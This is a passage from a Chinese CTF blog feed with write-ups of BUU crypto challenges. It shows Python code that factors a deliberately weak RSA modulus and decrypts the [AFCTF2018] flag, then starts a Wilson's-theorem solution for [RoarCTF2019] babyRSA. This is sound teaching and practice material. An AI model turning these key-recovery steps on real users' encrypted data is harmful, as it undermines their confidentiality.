style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.5887em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="p和q选取的特别近">p和q选取的特别近</h3>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>rsa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu刷题记录1</title>
    <link href="/2023/05/14/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
    <url>/2023/05/14/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    
    <content type="html"><![CDATA[<p>记录一下在buu刷的crypto题目</p><span id="more"></span><h1 id="刷题记录">刷题记录</h1><h2 id="AFCTF2018-可怜的RSA">[AFCTF2018]可怜的RSA</h2><p>做的挺难受的一道题</p><p>首先看题目给的文件</p><p>“flag.enc”:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW</span>/MgPwxVBSl46joFCQ1plcnlDGfL19K/<span class="hljs-number">3</span>PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/<span class="hljs-number">1</span>EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/<span class="hljs-number">6</span>/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==<br></code></pre></td></tr></table></figure><p>“public.key”:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">-----BEGIN</span> PUBLIC KEY<span class="hljs-params">-----</span><br>MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQM<span class="hljs-keyword">ls</span>Yv184kJfRcjeGa7Uc/4<br>3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv<br>tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59<br>NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT<br>+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt<br>Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM<br>5q5TAgMBAAE=<br><span class="hljs-params">-----END</span> PUBLIC KEY<span class="hljs-params">-----</span><br></code></pre></td></tr></table></figure><p>这道题不知道为什么不能用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">pow(c,d,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的方法来做，所以一直得到乱码</p><p>首先读公钥文件，转换成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]可怜的RSA/public.key&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>key=RSA.importKey(f)<br>n=key.n<br>e=key.e<br></code></pre></td></tr></table></figure><p>之后在线网站解密得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，随后就是求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">3133337</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br></code></pre></td></tr></table></figure><p>但是这里我分析密文文件的时候是用base64解密之后再转换成数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]可怜的RSA/flag.enc&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>c=b64decode(flag)<br>c=bytes_to_long(c)<br></code></pre></td></tr></table></figure><p>随后进行计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>得到一串乱码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>b2u~<span class="hljs-char escape_">\x</span>c4<span class="hljs-char escape_">\x</span>d0<span class="hljs-char escape_">\x</span>beV<span class="hljs-char escape_">\x</span>1c<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>0b<span class="hljs-char escape_">\x</span>16F<span class="hljs-char escape_">\x</span>ee[<span class="hljs-char escape_">\x</span>e9<span class="hljs-char escape_">\x</span>f4<span class="hljs-char escape_">\x</span>bfJ<span class="hljs-char escape_">\x</span>d2<span class="hljs-char escape_">\x</span>17p<span class="hljs-char escape_">\x</span>c2c<span class="hljs-char escape_">\x</span>fcvb<span class="hljs-char escape_">\x</span>14<span class="hljs-char escape_">\x</span>e4<span class="hljs-char escape_">\x</span>8c`A<span class="hljs-char escape_">\x</span>d4<span class="hljs-char escape_">\&#x27;</span>Iy=<span class="hljs-char escape_">\x</span>11<span class="hljs-char escape_">\x</span>eah:<span class="hljs-char escape_">\x</span>b9n<span class="hljs-char escape_">\x</span>0b<span class="hljs-char escape_">\x</span>01<span class="hljs-char escape_">\x</span>d2<span class="hljs-char escape_">\x</span>03V<span class="hljs-char escape_">\x</span>aa<span class="hljs-char escape_">\x</span>b2C&#123;<span class="hljs-char escape_">\x</span>c3yP<span class="hljs-char escape_">\x</span>8aw<span class="hljs-char escape_">\x</span>d3\\<span class="hljs-char escape_">\x</span>e5<span class="hljs-char escape_">\x</span>89<span class="hljs-char escape_">\x</span>8e<span class="hljs-char escape_">\x</span>8b<span class="hljs-char escape_">\x</span>f7<span class="hljs-char escape_">\x</span>96<span class="hljs-char escape_">\x</span>ab[&quot;<span class="hljs-char escape_">\x</span>fb<span class="hljs-char escape_">\x</span>b7(<span class="hljs-char escape_">\x</span>fd(<span class="hljs-char escape_">\x</span>8b<span class="hljs-char escape_">\x</span>a8L,<span class="hljs-char escape_">\x</span>f84,l<span class="hljs-char escape_">\x</span>f6<span class="hljs-char escape_">\x</span>ba<span class="hljs-char escape_">\x</span>0cr--<span class="hljs-char escape_">\x</span>af<span class="hljs-char escape_">\x</span>fc<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>cf6<span class="hljs-char escape_">\x</span>dfh<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>ae<span class="hljs-char escape_">\x</span>b5<span class="hljs-char escape_">\x</span>9dh&#123;<span class="hljs-char escape_">\x</span>89<span class="hljs-char escape_">\x</span>0f]/;<span class="hljs-char escape_">\x</span>fa<span class="hljs-char escape_">\x</span>cf<span class="hljs-char escape_">\x</span>adF<span class="hljs-char escape_">\x</span>9d<span class="hljs-char escape_">\x</span>dc<span class="hljs-char escape_">\x</span>15L!<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>ac<span class="hljs-char escape_">\x</span>af^e<span class="hljs-char escape_">\x</span>1e<span class="hljs-char escape_">\x</span>b4<span class="hljs-char escape_">\x</span>9d.<span class="hljs-char escape_">\x</span>ca8<span class="hljs-char escape_">\x</span>02<span class="hljs-char escape_">\x</span>f2<span class="hljs-char escape_">\x</span>8b5<span class="hljs-char escape_">\x</span>82<span class="hljs-char escape_">\x</span>c5<span class="hljs-char escape_">\x</span>f6<span class="hljs-char escape_">\x</span>e6<span class="hljs-char escape_">\x</span>d9<span class="hljs-char escape_">\x</span>1ci<span class="hljs-char escape_">\x</span>c3r<span class="hljs-char escape_">\x</span>9a<span class="hljs-char escape_">\x</span>7f<span class="hljs-char escape_">\x</span>90k<span class="hljs-char escape_">\x</span>da<span class="hljs-char escape_">\x</span>15/<span class="hljs-char escape_">\x</span>aaM_<span class="hljs-char escape_">\x</span>a1<span class="hljs-char escape_">\x</span>18wY<span class="hljs-char escape_">\x</span>98<span class="hljs-char escape_">\x</span>a7<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>e4vO<span class="hljs-char escape_">\x</span>a57H<span class="hljs-char escape_">\x</span>f6y@?k<span class="hljs-char escape_">\x</span>c2<span class="hljs-char escape_">\x</span>dd)<span class="hljs-char escape_">\x</span>f7<span class="hljs-char escape_">\x</span>0bvx&amp;<span class="hljs-char escape_">\x</span>d4H<span class="hljs-char escape_">\x</span>b1<span class="hljs-char escape_">\x</span>cf<span class="hljs-char escape_">\x</span>88<span class="hljs-char escape_">\x</span>f8<span class="hljs-char escape_">\x</span>90J<span class="hljs-char escape_">\x</span>a0f<span class="hljs-char escape_">\x</span>01]<span class="hljs-char escape_">\x</span>18<span class="hljs-char escape_">\x</span>f4<span class="hljs-char escape_">\x</span>f0YG-<span class="hljs-char escape_">\x</span>08<span class="hljs-char escape_">\x</span>08Jc<span class="hljs-char escape_">\x</span>eb<span class="hljs-char escape_">\x</span>16<span class="hljs-char escape_">\x</span>1bh<span class="hljs-char escape_">\x</span>be<span class="hljs-char escape_">\x</span>c3<span class="hljs-char escape_">\x</span>a9<span class="hljs-char escape_">\x</span>92<span class="hljs-char escape_">\x</span>a9D<span class="hljs-char escape_">\x</span>cc(<span class="hljs-char escape_">\x</span>1bt<span class="hljs-char escape_">\x</span>9e<span class="hljs-char escape_">\x</span>9a[g<span class="hljs-char escape_">\x</span>1eJ<span class="hljs-char escape_">\x</span>c5<span class="hljs-char escape_">\x</span>fc<span class="hljs-char escape_">\x</span>e7<span class="hljs-char escape_">\x</span>99<span class="hljs-char escape_">\x</span>cb<span class="hljs-char escape_">\x</span>aa<span class="hljs-char escape_">\x</span>f61D<span class="hljs-char escape_">\x</span>8d$<span class="hljs-char escape_">\x</span>f1<span class="hljs-char escape_">\x</span>ce<span class="hljs-char escape_">\&#x27;</span>0<span class="hljs-char escape_">\x</span>c5cuD<span class="hljs-char escape_">\x</span>88<span class="hljs-char escape_">\x</span>d8<span class="hljs-char escape_">\x</span>eb<span class="hljs-char escape_">\x</span>e9<span class="hljs-char escape_">\x</span>dd<span class="hljs-char escape_">\x</span>ac<span class="hljs-char escape_">\x</span>9cN<span class="hljs-char escape_">\x</span>c5-<span class="hljs-char escape_">\x</span>af<span class="hljs-char escape_">\x</span>1d<span class="hljs-char escape_">\x</span>de<span class="hljs-char escape_">\x</span>92<span class="hljs-char escape_">\x</span>eb<span class="hljs-char escape_">\x</span>e3)g<span class="hljs-char escape_">\x</span>e8<span class="hljs-char escape_">\r</span>;<span class="hljs-char escape_">\x</span>bc<span class="hljs-char escape_">\x</span>ab<span class="hljs-char escape_">\x</span>e6&#x27;</span><br></code></pre></td></tr></table></figure><p>之后到网上搜题解，无一例外的都用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">key = RSA.construct((n, e, d, p, q))<br>key = RSA.importKey(key.exportKey())<br>key = PKCS1_OAEP.new(key)<br>m = key.decrypt(c)<br></code></pre></td></tr></table></figure><p>我也不知道为什么用一般的写不出来，希望有大佬可以指点一下，这里就先死记了。</p><p>最后上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">import</span> gmpy2<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]可怜的RSA/flag.enc&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>c=b64decode(flag)<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]可怜的RSA/public.key&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>k=RSA.importKey(f)<br>n=k.n<br>e=k.e<br>p=<span class="hljs-number">3133337</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br>key = RSA.construct((n, e, <span class="hljs-built_in">int</span>(d), p, q))<br>key = RSA.importKey(key.exportKey())<br>key = PKCS1_OAEP.new(key)<br>m = key.decrypt(c)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="RoarCTF2019-babyRSA">[RoarCTF2019]babyRSA</h2><p>先看题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myGetPrime</span>():<br>    A= getPrime(<span class="hljs-number">513</span>)<br>    <span class="hljs-built_in">print</span>(A)<br>    B=A-random.randint(<span class="hljs-number">1e3</span>,<span class="hljs-number">1e5</span>)<br>    <span class="hljs-built_in">print</span>(B)<br>    <span class="hljs-keyword">return</span> sympy.nextPrime((B!)%A)<br>p=myGetPrime()<br><span class="hljs-comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br><span class="hljs-comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br><br>q=myGetPrime()<br><span class="hljs-comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br><span class="hljs-comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br><br>r=myGetPrime()<br><br>n=p*q*r<br><span class="hljs-comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br>c=<span class="hljs-built_in">pow</span>(flag,e,n)<br><span class="hljs-comment">#e=0x1001</span><br><span class="hljs-comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><span class="hljs-comment">#so,what is the flag?</span><br></code></pre></td></tr></table></figure><p>这道题的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">n,e,c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>都已经给出，重点就是求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>的值。那么就观察<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>y</mi><mi>G</mi><mi>e</mi><mi>t</mi><mi>P</mi><mi>r</mi><mi>i</mi><mi>m</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">myGetPrime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">G</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.13889em;">tP</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">im</span><span class="mord mathnormal">e</span></span></span></span>这个函数，发现它只需要求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">B!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span></span></span></span>就好了，而且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>都已经给出。但是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>的阶乘非常大，可能要费很长时间，跑了十分钟没跑出来，之后就搜题解，发现是用威尔逊定理写的，这个之前在信安数学基础学了但是现在都忘光了，看来得好好复习这些基础知识，那么话不多说，直接来看正确思路。</p><p>先来看看威尔逊定理说了什么：</p><p>如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>为素数，那么</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>≡</mo><mo>−</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">(p-1)!\equiv-1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><p>由这个威尔逊定理可以对这个题目进行转换：</p><p>首先<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>≡</mo><mo>−</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">(A-1)!\equiv-1\mod{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span></span></span></span>，此时令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mfrac><mrow><mo stretchy="false">(</mo><mi>A</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo></mrow><mrow><mi>B</mi><mo stretchy="false">!</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">k=\frac{(A-1)!}{B!}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mclose mtight">!</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">A</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)!</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，这个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>要比<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">B!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span></span></span></span>好计算的多，它相当于<span class="katex"><span class="katex-mathml"><math 